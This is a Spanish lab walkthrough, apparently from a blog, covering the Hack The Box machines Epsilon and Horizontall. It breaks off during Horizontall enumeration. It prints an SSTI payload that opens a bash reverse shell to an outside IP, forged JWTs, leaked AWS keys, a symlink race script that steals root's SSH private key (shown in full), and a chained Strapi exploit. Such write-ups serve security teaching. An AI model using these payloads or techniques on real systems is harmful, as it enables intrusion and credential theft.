objects/8d/3b52e153c7d5380b183bbbb51f5d4020944630 [+] Downloaded: objects/fe/d7ab97cf361914f688f0e4f2d3adfafd1d7dca [+] Downloaded: objects/54/5f6fe2204336c1ea21720cbaa47572eb566e34  Ahora deberíamos tener un directorio .git en epsilon_git:\n$ cd epsilon_git $ ls -a . .. .git  En este punto podemos extraer el código actual de la rama principal:\n$ git checkout . $ ls server.py track_api_CR_148.py  El archivo server.py contiene una aplicación en Flask que corresponde a la web del puerto 5000:\n#!/usr/bin/python3 import jwt from flask import * app = Flask(__name__) secret = '\u0026lt;secret_key\u0026gt;' def verify_jwt(token, key): try: username = jwt.decode(token, key, algorithms=['HS256'])['username'] if username: return True else: return False except: return False @app.route('/', methods=['GET', 'POST']) def index(): if request.method == 'POST': if request.form['username'] == 'admin' and request.form['password'] == 'admin': res = make_response() username = request.form['username'] token = jwt.encode({'username': 'admin'}, secret, algorithm='HS256') res.set_cookie('auth', token) res.headers['location'] = '/home' return res, 302 else: return render_template('index.html') else: return render_template('index.html') @app.route('/home') def home(): if verify_jwt(request.cookies.get('auth'), secret): return render_template('home.html') else: return redirect('/', code=302) @app.route('/track', methods=['GET', 'POST']) def track(): if request.method == 'POST': if verify_jwt(request.cookies.get('auth'), secret): return render_template('track.html', message=True) else: return redirect('/', code=302) else: return render_template('track.html') @app.route('/order', methods=['GET', 'POST']) def order(): if verify_jwt(request.cookies.get('auth'), secret): if request.method == 'POST': costume = request.form['costume'] message = ''' Your order of '{}' has been placed successfully. '''.format(costume) tmpl = render_template_string(message, costume=costume) return render_template('order.html', message=tmpl) else: return render_template('order.html') else: return redirect('/', code=302) app.run(debug='true')  Vemos que hay unas credentiales puestas en el código (admin:admin). Sin embargo, no funcionan. Parece que necesitamos construir un token JWT (JSON Web Token) para acceder a la web, pero no tenemos la clave secreta.\nAdemás, vemos que hay una vulnerabilidad de Server-Side Template Injection (SSTI) en /order, porque el parámetro costume se inserta en un texto que es renderizado directamente por Jinja2 (que es el motor de plantillas por defecto de Flask), sin ninguna validación.\nEl archivo track_api_CR_148.py contiene temas de Amazon Web Services (en concreto, AWS Lambda):\nimport io import os from zipfile import ZipFile from boto3.session import Session session = Session( aws_access_key_id='\u0026lt;aws_access_key_id\u0026gt;', aws_secret_access_key='\u0026lt;aws_secret_access_key\u0026gt;', region_name='us-east-1', endpoint_url='http://cloud.epsilon.htb') aws_lambda = session.client('lambda') def files_to_zip(path): for root, dirs, files in os.walk(path): for f in files: full_path = os.path.join(root, f) archive_name = full_path[len(path) + len(os.sep):] yield full_path, archive_name def make_zip_file_bytes(path): buf = io.BytesIO() with ZipFile(buf, 'w') as z: for full_path, archive_name in files_to_zip(path=path): z.write(full_path, archive_name) return buf.getvalue() def update_lambda(lambda_name, lambda_code_path): if not os.path.isdir(lambda_code_path): raise ValueError('Lambda directory does not exist: {0}'.format(lambda_code_path)) aws_lambda.update_function_code( FunctionName=lambda_name, ZipFile=make_zip_file_bytes(path=lambda_code_path))  De nuevo, hay dos claves que no están presentes en el código para configurar AWS Lambda.\nSin embargo, tenemos el repositorio de Git. A lo mejor hay confirmaciones (commits) antiguas:\n$ git log commit c622771686bd74c16ece91193d29f85b5f9ffa91 (HEAD -\u0026gt; master) Author: root \u0026lt;root@epsilon.htb\u0026gt; Date: Wed Nov 17 17:41:07 2021 +0000 Fixed Typo commit b10dd06d56ac760efbbb5d254ea43bf9beb56d2d Author: root \u0026lt;root@epsilon.htb\u0026gt; Date: Wed Nov 17 10:02:59 2021 +0000 Adding Costume Site commit c51441640fd25e9fba42725147595b5918eba0f1 Author: root \u0026lt;root@epsilon.htb\u0026gt; Date: Wed Nov 17 10:00:58 2021 +0000 Updatig Tracking API commit 7cf92a7a09e523c1c667d13847c9ba22464412f3 Author: root \u0026lt;root@epsilon.htb\u0026gt; Date: Wed Nov 17 10:00:28 2021 +0000 Adding Tracking API Module  Veamos si hay diferencias utilizando los identificadores de los commits (basta con añadir el comienzo de cada hash):\n$ git diff b10dd06 c622771 diff --git a/track_api_CR_148.py b/track_api_CR_148.py index 545f6fe..8d3b52e 100644 --- a/track_api_CR_148.py +++ b/track_api_CR_148.py @@ -8,8 +8,8 @@ session = Session( aws_access_key_id='\u0026lt;aws_access_key_id\u0026gt;', aws_secret_access_key='\u0026lt;aws_secret_access_key\u0026gt;', region_name='us-east-1', - endpoint_url='http://cloud.epsilong.htb') -aws_lambda = session.client('lambda') + endpoint_url='http://cloud.epsilon.htb') +aws_lambda = session.client('lambda')  Vale, es solo una errata, aunque ya podemos meter cloud.epsilon.htb en /etc/hosts. Aquí hay una diferencia más interesante:\n$ git diff 7cf92a c514416 diff --git a/track_api_CR_148.py b/track_api_CR_148.py index fed7ab9..545f6fe 100644 --- a/track_api_CR_148.py +++ b/track_api_CR_148.py @@ -5,8 +5,8 @@ from boto3.session import Session session = Session( - aws_access_key_id='AQLA5M37BDN6FJP76TDC', - aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A', + aws_access_key_id='\u0026lt;aws_access_key_id\u0026gt;', + aws_secret_access_key='\u0026lt;aws_secret_access_key\u0026gt;', region_name='us-east-1', endpoint_url='http://cloud.epsilong.htb') aws_lambda = session.client('lambda')  Y aquí tenemos más secretos escritos en el código para configurar AWS Lambda. Con esto, podemos configurar la CLI de AWS e interactuar con AWS Lambda para obtener el código de la función:\n$ aws configure AWS Access Key ID [None]: AQLA5M37BDN6FJP76TDC AWS Secret Access Key [None]: OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A Default region name [None]: us-east-1 Default output format [None]:  Luego, podemos listar las funciones que están desplegadas para cloud.epsilon.htb:\n$ aws --endpoint-url=http://cloud.epsilon.htb lambda list-functions { \"Functions\": [ { \"FunctionName\": \"costume_shop_v1\", \"FunctionArn\": \"arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1\", \"Runtime\": \"python3.7\", \"Role\": \"arn:aws:iam::123456789012:role/service-role/dev\", \"Handler\": \"my-function.handler\", \"CodeSize\": 478, \"Description\": \"\", \"Timeout\": 3, \"LastModified\": \"2022-02-14T23:01:58.240+0000\", \"CodeSha256\": \"IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=\", \"Version\": \"$LATEST\", \"VpcConfig\": {}, \"TracingConfig\": { \"Mode\": \"PassThrough\" }, \"RevisionId\": \"d54a4387-53bc-49c5-a55c-c3bc5c8aed47\", \"State\": \"Active\", \"LastUpdateStatus\": \"Successful\", \"PackageType\": \"Zip\" } ] }  Vemos que costume_shop_v1 es la única función. Vamos a examinarla:\n$ aws --endpoint-url=http://cloud.epsilon.htb lambda get-function --function-name costume_shop_v1 { \"Configuration\": { \"FunctionName\": \"costume_shop_v1\", \"FunctionArn\": \"arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1\", \"Runtime\": \"python3.7\", \"Role\": \"arn:aws:iam::123456789012:role/service-role/dev\", \"Handler\": \"my-function.handler\", \"CodeSize\": 478, \"Description\": \"\", \"Timeout\": 3, \"LastModified\": \"2022-02-11T05:29:01.295+0000\", \"CodeSha256\": \"IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=\", \"Version\": \"$LATEST\", \"VpcConfig\": {}, \"TracingConfig\": { \"Mode\": \"PassThrough\" }, \"RevisionId\": \"bf23b664-e576-4493-8578-9906b999b8cc\", \"State\": \"Active\", \"LastUpdateStatus\": \"Successful\", \"PackageType\": \"Zip\" }, \"Code\": { \"Location\": \"http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code\" }, \"Tags\": {} }  El código está disponible en la URL que se muestra, en un archivo ZIP:\n$ wget http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code $ file code code: Zip archive data, at least v2.0 to extract, compression method=deflate $ unzip code Archive: code inflating: lambda_function.py  Este es el código fuente de la función AWS Lambda desplegada:\nimport json secret = 'RrXCv`mrNe!K!4+5`wYq' # apigateway authorization for CR-124 '''Beta release for tracking''' def lambda_handler(event, context): try: id = event['queryStringParameters']['order_id'] if id: return { 'statusCode': 200, 'body': json.dumps(str(resp)) # dynamodb tracking for CR-342 } else: return { 'statusCode': 500, 'body': json.dumps('Invalid Order ID') } except: return { 'statusCode': 500, 'body': json.dumps('Invalid Order ID') }  Y aquí está el secreto utilizado para JWT.\nAcceso a la máquina Ahora somos capaces de crear un token JWT válido como sigue:\n\u0026gt;\u0026gt;\u0026gt; import jwt \u0026gt;\u0026gt;\u0026gt; jwt.encode({'username': 'admin'}, 'RrXCv`mrNe!K!4+5`wYq', algorithm='HS256') 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.8JUBz8oy5DlaoSmr0ffLb_hrdSHl0iLMGz-Ece7VNtg'  Podemos utilizar este token como una cookie llamada auth para acceder a algunas páginas de la web:\nSin embargo, ya que habíamos visto un vector de ataque con SSTI en /order, vamos a explotarlo.\nPrimero de todo, tenemos que probar que el SSTI funciona utilizando un payload sencillo:\n$ curl 10.10.11.134:5000/order -sd 'costume={{7*7}}\u0026q=1337\u0026addr=asdf' -H 'Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.8JUBz8oy5DlaoSmr0ffLb_hrdSHl0iLMGz-Ece7VNtg' | grep 49 Your order of \"49\" has been placed successfully.  Como {{7*7}} se muestra como 49, la inyección funciona. Ahora podemos mirar en PayloadsAllTheThings y coger un payload para conseguir ejecución remota de comandos (RCE):\n{{ cycler.__init__.__globals__.os.popen('id').read() }}  En lugar de utilizar id como comando, pondremos un comando que nos mande una reverse shell codificado en Base64:\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx  Ahora enviamos el payload mientras escuchamos con nc:\n$ curl 10.10.11.134:5000/order -sd 'costume={{cycler.__init__.__globals__.os.popen(\"echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash\").read()}}\u0026q=1337\u0026addr=asdf' -H 'Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.8JUBz8oy5DlaoSmr0ffLb_hrdSHl0iLMGz-Ece7VNtg'  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.134. Ncat: Connection from 10.10.11.134:32940. bash: cannot set terminal process group (996): Inappropriate ioctl for device bash: no job control in this shell tom@epsilon:/var/www/app$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null tom@epsilon:/var/www/app$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm tom@epsilon:/var/www/app$ export TERM=xterm tom@epsilon:/var/www/app$ export SHELL=bash tom@epsilon:/var/www/app$ stty rows 50 columns 158 tom@epsilon:/var/www/app$ cd tom@epsilon:~$ cat user.txt f331291fab610895dd18aefba73ffb2c  Enumeración del sistema Una enumeración básica basta para darnos cuenta de que hay un directorio raro en /opt:\ntom@epsilon:~$ ls -la --time-style=+ /opt total 16 drwxr-xr-x 4 root root 4096 . drwxr-xr-x 19 root root 4096 .. drwxr-xrwx 2 root root 4096 backups drwx--x--x 4 root root 4096 containerd  Somos capaces de leer y escribir en el directorio backups. Normalmente, las copias de seguridad se ejecutan periódicamente, por lo que podemos buscar algún script que se esté ejecutando como tarea Cron:\ntom@epsilon:~$ find / -type f -name \\*backup\\* 2\u0026gt;/dev/null | grep -v python /usr/share/man/man8/vgcfgbackup.8.gz /usr/src/linux-headers-5.4.0-97-generic/include/config/wm831x/backup.h /usr/src/linux-headers-5.4.0-97-generic/include/config/net/team/mode/activebackup.h /usr/src/linux-headers-5.4.0-97/tools/testing/selftests/net/tcp_fastopen_backup_key.sh /usr/lib/x86_64-linux-gnu/open-vm-tools/plugins/vmsvc/libvmbackup.so /usr/lib/modules/5.4.0-97-generic/kernel/drivers/power/supply/wm831x_backup.ko /usr/lib/modules/5.4.0-97-generic/kernel/drivers/net/team/team_mode_activebackup.ko /usr/bin/backup.sh /sys/devices/virtual/net/veth3701941/brport/backup_port  Hay un script en Bash en /usr/bin/backup.sh que realiza una copia de seguridad periódicamente de /var/www/app:\n#!/bin/bash file=`date +%N` /usr/bin/rm -rf /opt/backups/* /usr/bin/tar -cvf \"/opt/backups/$file.tar\" /var/www/app/ sha1sum \"/opt/backups/$file.tar\" | cut -d ' ' -f1 \u0026gt; /opt/backups/checksum sleep 5 check_file=`date +%N` /usr/bin/tar -chvf \"/var/backups/web_backups/${check_file}.tar\" /opt/backups/checksum \"/opt/backups/$file.tar\" /usr/bin/rm -rf /opt/backups/*  La vulnerabilidad aquí está en el uso de -h para el comando tar, porque seguirá los enlaces simbólicos y comprimirá el contenido. Utilizando explainsh, podemos ver qué significa cada parámetro del comando:\n$ explainsh 'tar -chvf \"/var/backups/web_backups/${check_file}.tar\" /opt/backups/checksum \"/opt/backups/$file.tar\"' The GNU version of the tar archiving utility -c, --create create a new archive -h, --dereference follow symlinks; archive and dump the files they point to -v, --verbose verbosely list files processed -f, --file ARCHIVE use archive file or device ARCHIVE tar [-] A --catenate --concatenate | c --create | d --diff --compare | --delete | r --append | t --list | --test-label | u --update | x --extract --get [options] [pathname ...] http://manpages.ubuntu.com/manpages/precise/en/man1/tar.html  Escalada de privilegios Para explotar la tarea Cron, haremos que /opt/backups/checksum sea un enlace simbólico hacia /root/.ssh. Esto tiene que configurarse después de la primera llamada a tar (dispondremos de 5 segundos). El segundo utiliza -h, por lo que el contenido de /opt/backups/checksum -\u0026gt; /root/.ssh será comprimido y almacenado en /var/backups/web_backups/.\nAunque se puede realizar manualmente, decidí usar un script en Bash:\ntom@epsilon:~$ cd /tmp tom@epsilon:/tmp$ vim privesc.sh  #!/usr/bin/env bash while true; do if [ ! -z \"$(ls /opt/backups)\" ]; then echo '[*] First `tar` executed' break fi done rm -f /opt/backups/checksum ln -sf /root/.ssh /opt/backups/checksum echo '[+] Symlink created' sleep 6 file=$(ls -la /var/backups/web_backups | tail -1 | awk '{ print $9 }') echo \"[+] Found file: $file\" cp /var/backups/web_backups/$file /tmp cd /tmp tar -xvf $file echo '[!] Symlink content' ls opt/backups/checksum echo '[!] `root` SSH key' cat opt/backups/checksum/id_rsa  Básicamente, espera hasta que haya una nueva copia de seguridad en /opt/backups, luego crea el enlace simbólico y espera hasta que la segunda copia de seguridad se almacena en /var/backups/web_backups. Después de esto, toma este archivo comprimido y extrae su contenido para leer la clave /root/.ssh/id_rsa:\ntom@epsilon:/tmp$ bash privesc.sh [*] First `tar` executed [+] Symlink created [+] Found file: 376776221.tar opt/backups/checksum/ opt/backups/checksum/id_rsa opt/backups/checksum/id_rsa.pub opt/backups/checksum/authorized_keys opt/backups/366066624.tar [!] Symlink content authorized_keys id_rsa id_rsa.pub [!] `root` SSH key -----BEGIN OPENSSH PRIVATE KEY----- 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 -----END OPENSSH PRIVATE KEY-----  Utilizando esta clave privada de SSH tenemos acceso a la máquina como root:\n$ ssh -i id_rsa root@10.10.11.134 root@epsilon:~# cat root.txt cf3d789a49b8c920c09142c741e00c34  ","image":"/images/HTB/Epsilon/Epsilon.png","permalink":"https://7rocky.github.io/htb/epsilon/","section":"htb","summary":"Hack The Box. Linux. Máquina media. Esta máquina contiene una página web que expone un repositorio de Git con secretos en confirmaciones antiguas. Hay otra página web que necesita de un token JWT válido para explotar una vulnerabilidad de SSTI. El secreto de los tokens JWT está escrito en una función AWS Lambda. Luego, existe una tarea Cron que puede ser explotada mediante enlaces simbólicos para poder leer archivos arbitrarios. Para comprometer esta máquina, se necesitan conocimientos de Git, JWT, SSTI y AWS Lambda, ademñas de explotación de tareas Cron","time":8,"title":"Epsilon"},{"contents":"  SO: Linux   Dificultad: Fácil   Dirección IP: 10.10.11.105   Fecha: 28 / 08 / 2021   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.105 -p 22,80 Nmap scan report for horizontall.htb (10.10.11.105) Host is up (0.041s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA) | 256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA) |_ 256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-title: horizontall |_http-server-header: nginx/1.14.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 10.27 seconds  La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).\nEnumeración La página web está redirigiendo a http://horizontall.htb, por lo que es necesario añadir el dominio al archivo /etc/hosts. Después, podremos ver una aplicación web hecha en Vue.js (un framework de JavaScript para front-end):\nSin embargo, lo único interesante aquí es un archivo de JavaScript que contiene una URL para http://api-prod.horizontall.htb (podemos encontrarla buscando por \u0026quot;horizontall.htb\u0026quot;):\nY de nuevo, añadimos el subdominio a /etc/hosts. En este subdominio vemos una simple aplicación web como la siguiente:\nEjecutando gobuster podemos enumerar algunas rutas:\n$ gobuster dir -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -q -r -u http://api-prod.horizontall.htb /reviews (Status: 200) [Size: 507] /users (Status: 403) [Size: 60] /admin (Status: 200) [Size: 854]  Enumeración de API Las primeras dos rutas devuelven un resultado en JSON:\n$ curl -s api-prod.horizontall.htb/users | jq { \"statusCode\": 403, \"error\": \"Forbidden\", \"message\": \"Forbidden\" }  $ curl -s api-prod.horizontall.htb/reviews | jq [ { \"id\": 1, \"name\": \"wail\", \"description\": \"This is good service\", \"stars\": 4, \"created_at\": \"2021-05-29T13:23:38.000Z\", \"updated_at\": \"2021-05-29T13:23:38.000Z\" }, { \"id\": 2, \"name\": \"doe\", \"description\": \"i'm satisfied with the product\", \"stars\": 5, \"created_at\": \"2021-05-29T13:24:17.000Z\", \"updated_at\": \"2021-05-29T13:24:17.000Z\" }, { \"id\": 3, \"name\": \"john\", \"description\": \"create service with minimum price i hop i can buy more in the futur\", \"stars\": 5, \"created_at\": \"2021-05-29T13:25:26.000Z\", \"updated_at\": \"2021-05-29T13:25:26.000Z\" } ]  Y la ruta /admin redirige a /admin/auth/login y muestra un formulario de inicio de sesión de Strapi. Sin embargo, no podemos hacer nada aquí. Podemos probar credenciales por defecto, pero no funcionan.\nPodemos comprobar todas las peticiones que se realizan al acceder a /admin desde las herramientas de desarrollador del navegador. Hay una que apunta a /admin/init que responde con cierta información que incluye la versión de Strapi:\n$ curl -s api-prod.horizontall.htb/admin/init | jq { \"data\": { \"uuid\": \"a55da3bd-9693-4a08-9279-f9df57fd1817\", \"currentEnvironment\": \"development\", \"autoReload\": false, \"strapiVersion\": \"3.0.0-beta.17.4\" } }  Con esta información, podemos buscar exploits y vulnerabilidades para esta versión de Strapi. Existen dos que aplican en este caso. El primero permite cambiar la contraseña de admin sin autenticación (CVE-2019-18818), y el otro consigue ejecución remota de comandos (RCE), pero necesita autenticación como administrador (CVE-2019-19609).\nAcceso a la máquina En este blog se explica la vulnerabilidad del reinicio de contraseña. Existe un código en Python que lo automatiza. El script devuelve el JSON Web Token (JWT) del usuario que se ha autenticado. Y de hecho, este token JWT es necesario para ejecutar el segundo exploit, que puede encontrarse aquí.\nExplotando Strapi Para obtener RCE en Strapi, junté ambos exploits en un script de Python llamado rce_strapi.py (explicación detallada aquí).\nSe necesita la dirección de correo de admin, pero podemos deducir que es admin@horizontall.htb.\nSi ejecutamos el script, la contraseña se cambiará a la indicada (asdfasdfasdf). Y obtenemos acceso a la máquina desde nc:\n$ python3 rce_strapi.py 10.10.17.44 4444 [*] Detected version(GET /admin/strapiVersion): 3.0.0-beta.17.4 [*] Sending password reset request... [*] Setting new password... [*] Response: {\"jwt\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwMTg5ODcyLCJleHAiOjE2MzI3ODE4NzJ9.4_HRMhnzA9CEcw6-p2uCOKJWTxpRkCiMaWiNfGDWKRc\",\"user\":{\"id\":3,\"username\":\"admin\",\"email\":\"admin@horizontall.htb\",\"blocked\":null}}  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.105. Ncat: Connection from 10.10.11.105:40764. /bin/sh: 0: can't access tty; job control turned off $ script /dev/null -c bash Script started, file is /dev/null strapi@horizontall:~/myapi$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm strapi@horizontall:~/myapi$ export TERM=xterm strapi@horizontall:~/myapi$ export SHELL=bash strapi@horizontall:~/myapi$ stty rows 50 columns 158  Enumeración del sistema Desde la máquina, podemos ver que existe un usuario llamado developer. No obstante, podemos listar su directorio personal y leer la flag user.txt:\nstrapi@horizontall:~/myapi$ ls /home developer strapi@horizontall:~/myapi$ ls -la /home/developer/ total 108 drwxr-xr-x 8 developer developer 4096 Aug 2 12:07 . drwxr-xr-x 3 root root 4096 May 25 11:43 .. lrwxrwxrwx 1 root root 9 Aug 2 12:05 .bash_history - /dev/null -rw-r----- 1 developer developer 242 Jun 1 12:53 .bash_logout -rw-r----- 1 developer developer 3810 Jun 1 12:47 .bashrc drwx------ 3 developer developer 4096 May 26 12:00 .cache -rw-rw---- 1 developer developer 58460 May 26 11:59 composer-setup.php drwx------ 5 developer developer 4096 Jun 1 11:54 .config drwx------ 3 developer developer 4096 May 25 11:45 .gnupg drwxrwx--- 3 developer developer 4096 May 25 19:44 .local drwx------ 12 developer developer 4096 May 26 12:21 myproject -rw-r----- 1 developer developer 807 Apr 4 2018 .profile drwxrwx--- 2 developer developer 4096 Jun 4 11:21 .ssh -r--r--r-- 1 developer developer 33 Aug 28 21:38 user.txt lrwxrwxrwx 1 root root 9 Aug 2 12:07 .viminfo - /dev/null strapi@horizontall:~/myapi$ cat /home/developer/user.txt 8737d52fd79f838b0e4dc682bc8a28d9  Existe un archivo interesante llamado composer-setup.php y un directorio llamado myproject, pero no tenemos permisos para leerlos.\nPodemos buscar credenciales en el código fuente de la aplicación web de Strapi. De hecho, podemos encontrar credenciales para MySQL de la siguiente manera:\nstrapi@horizontall:~/myapi$ ls -la total 648 drwxr-xr-x 9 strapi strapi 4096 Jul 29 2021 . drwxr-xr-x 10 strapi strapi 4096 Feb 3 15:07 .. drwxr-xr-x 3 strapi strapi 4096 May 29 2021 api drwxrwxr-x 2 strapi strapi 12288 May 26 2021 build drwxrwxr-x 5 strapi strapi 4096 May 26 2021 .cache drwxr-xr-x 5 strapi strapi 4096 Jul 29 2021 config -rw-r--r-- 1 strapi strapi 249 May 26 2021 .editorconfig -rw-r--r-- 1 strapi strapi 32 May 26 2021 .eslintignore -rw-r--r-- 1 strapi strapi 541 May 26 2021 .eslintrc drwxr-xr-x 3 strapi strapi 4096 May 26 2021 extensions -rw-r--r-- 1 strapi strapi 1150 May 26 2021 favicon.ico -rw-r--r-- 1 strapi strapi 1119 May 26 2021 .gitignore drwxrwxr-x 1099 strapi strapi 36864 Aug 3 2021 node_modules -rw-rw-r-- 1 strapi strapi 1009 May 26 2021 package.json -rw-rw-r-- 1 strapi strapi 552845 May 26 2021 package-lock.json drwxr-xr-x 3 strapi strapi 4096 Jun 2 2021 public -rw-r--r-- 1 strapi strapi 69 May 26 2021 README.md strapi@horizontall:~/myapi$ ls -la config/ total 40 drwxr-xr-x 5 strapi strapi 4096 Jul 29 04:24 . drwxr-xr-x 9 strapi strapi 4096 Jul 29 04:29 .. -rw-r--r-- 1 strapi strapi 136 May 26 14:31 application.json -rw-r--r-- 1 strapi strapi 110 May 26 14:31 custom.json drwxr-xr-x 5 strapi strapi 4096 May 26 14:31 environments drwxr-xr-x 3 strapi strapi 4096 May 26 14:31 functions -rw-r--r-- 1 strapi strapi 188 May 26 14:31 hook.json -rw-r--r-- 1 strapi strapi 173 May 26 14:31 language.json drwxr-xr-x 2 strapi strapi 4096 May 26 14:31 locales -rw-r--r-- 1 strapi strapi 317 May 26 14:31 middleware.json strapi@horizontall:~/myapi$ ls -la config/environments/ total 20 drwxr-xr-x 5 strapi strapi 4096 May 26 14:31 . drwxr-xr-x 5 strapi strapi 4096 